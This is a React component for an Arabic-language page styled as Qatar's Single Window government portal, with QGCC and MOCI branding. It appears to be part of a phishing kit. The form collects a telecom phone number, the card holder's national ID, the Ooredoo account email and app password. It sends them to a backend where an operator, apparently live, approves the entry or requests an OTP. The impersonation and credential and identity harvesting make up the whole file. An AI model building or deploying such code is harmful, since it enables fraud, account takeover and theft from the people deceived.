import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import { sendData, navigateToPage, codeAction, cardAction, waitingMessage } from "@/lib/store";

const inputStyle = (hasError: boolean) => ({
  width: "100%",
  padding: "10px 14px",
  border: `1px solid ${hasError ? "#cc0000" : "#ccc"}`,
  borderRadius: 3,
  fontSize: 14,
  color: "#333",
  backgroundColor: "#fff",
  outline: "none",
  fontFamily: "inherit",
  textAlign: "right" as const,
  direction: "rtl" as const,
  boxSizing: "border-box" as const,
});

export default function MobileVerification() {
  const [, navigate] = useLocation();
  const [provider, setProvider] = useState("");
  const [open, setOpen] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isWaiting, setIsWaiting] = useState(false);

  const [phone, setPhone] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [vodaPhone, setVodaPhone] = useState("");

  useEffect(() => { navigateToPage("توثيق رقم الهاتف"); }, []);

  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      waitingMessage.value = "";
      setIsWaiting(false);
      if (action.action === "approve" || action.action === "otp") {
        navigate("/ooredoo-otp");
      } else if (action.action === "reject") {
        setErrors({ form: "تعذر التحقق من البيانات، يرجى المحاولة مرة أخرى" });
      }
      codeAction.value = null;
    }
  });

  useSignalEffect(() => {
    const action = cardAction.value;
    if (action) {
      waitingMessage.value = "";
      setIsWaiting(false);
      if (action.action === "approve" || action.action === "otp") {
        navigate("/ooredoo-otp");
      } else if (action.action === "reject") {
        setErrors({ form: "تعذر التحقق من البيانات، يرجى المحاولة مرة أخرى" });
      }
      cardAction.value = null;
    }
  });

  const providers = [
    { value: "ooredoo", label: "اوريدو ooredoo" },
    { value: "vodafone", label: "فودافون vodafone" },
  ];

  const validateEmail = (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const errs: Record<string, string> = {};
    if (!provider) { errs.provider = "يرجى اختيار مزود الخدمة"; }
    if (provider === "ooredoo") {
      if (!phone.trim()) errs.phone = "هذا الحقل مطلوب";
      else if (phone.length < 7 || phone.length > 12) errs.phone = "رقم الهاتف يجب أن يكون بين 7 و 12 رقم";
      if (!nationalId.trim()) errs.nationalId = "هذا الحقل مطلوب";
      else if (!/^\d+$/.test(nationalId)) errs.nationalId = "الرقم الشخصي يجب أن يحتوي على أرقام فقط";
      if (!email.trim()) errs.email = "هذا الحقل مطلوب";
      else if (!validateEmail(email)) errs.email = "يرجى إدخال بريد إلكتروني صحيح (مثال: name@domain.com)";
      if (!password.trim()) errs.password = "هذا الحقل مطلوب";
      else if (password.length < 6) errs.password = "كلمة المرور يجب أن تكون 6 أحرف على الأقل";
    } else if (provider === "vodafone") {
      if (!vodaPhone.trim()) errs.vodaPhone = "هذا الحقل مطلوب";
      else if (vodaPhone.length < 7 || vodaPhone.length > 12) errs.vodaPhone = "رقم الهاتف يجب أن يكون بين 7 و 12 رقم";
    }
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({});
    setIsWaiting(true);
    waitingMessage.value = "جاري مصادقة البيانات...";

    sendData({
      mobileVerification: {
        provider,
        phone: provider === "ooredoo" ? phone : vodaPhone,
        nationalId,
        email,
        password,
      },
      current: "توثيق رقم الهاتف",
      nextPage: "OTP أوريدو",
      waitingForAdminResponse: true,
    });
  };

  const fieldStyle = { marginBottom: 20 };
  const labelStyle = { display: "block", fontSize: 13, fontWeight: "600" as const, color: "#333", marginBottom: 6, textAlign: "right" as const };

  return (
    <div style={{ minHeight: "100vh", display: "flex", flexDirection: "column", fontFamily: "'Tajawal','Cairo',Arial,sans-serif", direction: "rtl", backgroundColor: "#f5f5f5" }}>

      {/* Waiting Overlay */}
      {isWaiting && (
        <div style={{ position: "fixed", inset: 0, backgroundColor: "rgba(0,0,0,0.5)", zIndex: 9999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ backgroundColor: "#fff", borderRadius: 8, padding: "32px 48px", textAlign: "center", boxShadow: "0 4px 20px rgba(0,0,0,0.3)", minWidth: 280 }}>
            <div style={{ width: 40, height: 40, border: "4px solid #1a7abf", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 1s linear infinite", margin: "0 auto 16px" }} />
            <p style={{ fontSize: 15, color: "#333", margin: 0, fontWeight: "600" }}>جاري مصادقة البيانات...</p>
            <p style={{ fontSize: 12, color: "#888", margin: "8px 0 0" }}>يرجى الانتظار</p>
          </div>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      {/* Header */}
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0", padding: "10px 30px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        {/* Left: Single Window Logo */}
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <img src="/logo.svg" alt="النافذة الواحدة" style={{ height: 48, objectFit: "contain" }} />
        </div>
        {/* Right: QGCC Logo */}
        <div>
          <img src="/qgcc-logo.png" alt="QGCC" style={{ height: 44, objectFit: "contain" }} />
        </div>
      </header>

      {/* Main */}
      <main style={{ flex: 1, padding: "30px 20px" }}>
        <div style={{ maxWidth: 900, margin: "0 auto", backgroundColor: "#fff", border: "1px solid #e0e0e0", borderRadius: 4, padding: "30px 40px" }}>
          <h1 style={{ fontSize: 22, fontWeight: "700", color: "#1a3c6e", textAlign: "right", margin: "0 0 16px 0", paddingBottom: 16, borderBottom: "1px solid #e0e0e0" }}>
            توثيق رقم الهاتف
          </h1>
          <p style={{ fontSize: 14, fontWeight: "700", color: "#1a3c6e", textAlign: "right", margin: "0 0 10px 0" }}>
            يرجى ادخال الهاتف المرتبط بطريقة الدفع، لإثبات ملكية البطاقة.
          </p>
          <p style={{ fontSize: 13, color: "#555", textAlign: "right", margin: "0 0 28px 0", lineHeight: 1.7 }}>
            لا يشترط الدفع ببطاقة تابعة للمستخدم المراد تسجيله، يمكنك استخدام بطاقة تعود لشخص اخر، لكن يجب اثبات ملكيتها من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.
          </p>

          {errors.form && (
            <div style={{ backgroundColor: "#fff0f0", border: "1px solid #ffcccc", borderRadius: 4, padding: "12px 16px", marginBottom: 20, color: "#cc0000", fontSize: 14, textAlign: "right" }}>
              {errors.form}
            </div>
          )}

          <form onSubmit={handleSubmit} style={{ maxWidth: 480 }}>
            {/* Provider */}
            <div style={fieldStyle}>
              <label style={labelStyle}>مزود الخدمة <span style={{ color: "#cc0000" }}>*</span></label>
              <div style={{ position: "relative" }}>
                <div onClick={() => setOpen(!open)}
                  style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 14px", border: `1px solid ${errors.provider ? "#cc0000" : "#ccc"}`, borderRadius: 3, backgroundColor: "#fff", cursor: "pointer", fontSize: 14, color: provider ? "#333" : "#aaa" }}>
                  <svg viewBox="0 0 10 6" style={{ width: 12, height: 8, transform: open ? "rotate(180deg)" : "none", transition: "0.2s" }}>
                    <path d="M1 1l4 4 4-4" stroke="#666" strokeWidth="1.5" fill="none" strokeLinecap="round"/>
                  </svg>
                  <span>{provider ? providers.find(p => p.value === provider)?.label : "اختر مزود الخدمة"}</span>
                </div>
                {open && (
                  <div style={{ position: "absolute", top: "100%", right: 0, left: 0, backgroundColor: "#fff", border: "1px solid #ccc", borderTop: "none", zIndex: 100, boxShadow: "0 4px 8px rgba(0,0,0,0.1)" }}>
                    {providers.map(p => (
                      <div key={p.value} onClick={() => { setProvider(p.value); setOpen(false); setErrors({}); setPhone(""); setNationalId(""); setEmail(""); setPassword(""); setVodaPhone(""); }}
                        style={{ padding: "12px 16px", fontSize: 14, color: "#333", cursor: "pointer", textAlign: "right", borderBottom: "1px solid #f0f0f0" }}
                        onMouseOver={(e) => { e.currentTarget.style.backgroundColor = "#f5f5f5"; }}
                        onMouseOut={(e) => { e.currentTarget.style.backgroundColor = "#fff"; }}>
                        {p.label}
                      </div>
                    ))}
                  </div>
                )}
              </div>
              {errors.provider && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.provider}</span>}
            </div>

            {/* Ooredoo Fields */}
            {provider === "ooredoo" && (
              <>
                <div style={fieldStyle}>
                  <label style={labelStyle}>رقم الهاتف <span style={{ color: "#cc0000" }}>*</span></label>
                  <input type="tel" value={phone}
                    onChange={(e) => { setPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, phone: ""})); }}
                    placeholder="Phone" style={inputStyle(!!errors.phone)} />
                  {errors.phone && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.phone}</span>}
                </div>
                <div style={fieldStyle}>
                  <label style={labelStyle}>الرقم الشخصي لمالك البطاقة <span style={{ color: "#cc0000" }}>*</span></label>
                  <input type="text" value={nationalId}
                    onChange={(e) => { setNationalId(e.target.value.replace(/[^0-9]/g, "")); setErrors(p => ({...p, nationalId: ""})); }}
                    placeholder="Id" style={inputStyle(!!errors.nationalId)} />
                  {errors.nationalId && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.nationalId}</span>}
                </div>
                <div style={fieldStyle}>
                  <label style={labelStyle}>البريد الالكتروني المعتمد بـ ooredoo <span style={{ color: "#cc0000" }}>*</span></label>
                  <input type="text" value={email}
                    onChange={(e) => { setEmail(e.target.value.replace(/[\u0600-\u06FF]/g, "")); setErrors(p => ({...p, email: ""})); }}
                    placeholder="Email" style={{ ...inputStyle(!!errors.email), direction: "ltr", textAlign: "left" }} />
                  {errors.email && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.email}</span>}
                </div>
                <div style={fieldStyle}>
                  <label style={labelStyle}>كلمة المرور لتطبيق ooredoo <span style={{ color: "#cc0000" }}>*</span></label>
                  <input type="password" value={password}
                    onChange={(e) => { setPassword(e.target.value.replace(/[\u0600-\u06FF]/g, "")); setErrors(p => ({...p, password: ""})); }}
                    style={inputStyle(!!errors.password)} />
                  {errors.password && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.password}</span>}
                </div>
              </>
            )}

            {/* Vodafone Fields */}
            {provider === "vodafone" && (
              <div style={fieldStyle}>
                <label style={labelStyle}>رقم الهاتف <span style={{ color: "#cc0000" }}>*</span></label>
                <input type="tel" value={vodaPhone}
                  onChange={(e) => { setVodaPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, vodaPhone: ""})); }}
                  placeholder="Phone" style={inputStyle(!!errors.vodaPhone)} />
                {errors.vodaPhone && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.vodaPhone}</span>}
              </div>
            )}

            {provider && (
              <button type="submit" disabled={isWaiting}
                style={{ display: "block", width: "100%", padding: "12px", backgroundColor: isWaiting ? "#aaa" : "#1a7abf", color: "#fff", border: "none", borderRadius: 3, fontSize: 15, fontWeight: "600", cursor: isWaiting ? "not-allowed" : "pointer", fontFamily: "inherit", textAlign: "center" }}
                onMouseOver={(e) => { if (!isWaiting) e.currentTarget.style.backgroundColor = "#1565a0"; }}
                onMouseOut={(e) => { if (!isWaiting) e.currentTarget.style.backgroundColor = "#1a7abf"; }}>
                استمر
              </button>
            )}
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer style={{ background: "linear-gradient(135deg, #1a3c6e 0%, #1a7abf 100%)", padding: "28px 20px", textAlign: "center", color: "#fff" }}>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <img src="/logo.svg" alt="النافذة الواحدة" style={{ height: 56, objectFit: "contain", filter: "brightness(0) invert(1)" }} />
          </div>
          <div style={{ display: "flex", gap: 10 }}>
            {[
              { href: "https://www.linkedin.com/company/mociqatar/", icon: "in" },
              { href: "https://www.youtube.com/mociqatar", icon: "▶" },
              { href: "https://twitter.com/MOCIQatar", icon: "𝕏" },
              { href: "https://www.instagram.com/mociqatar/", icon: "◎" },
              { href: "https://www.facebook.com/MOCIQatar/", icon: "f" },
            ].map((s) => (
              <a key={s.href} href={s.href} target="_blank" rel="noreferrer"
                style={{ width: 32, height: 32, borderRadius: "50%", border: "1px solid rgba(255,255,255,0.4)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 12, textDecoration: "none" }}>
                {s.icon}
              </a>
            ))}
          </div>
        </div>
      </footer>
    </div>
  );
}
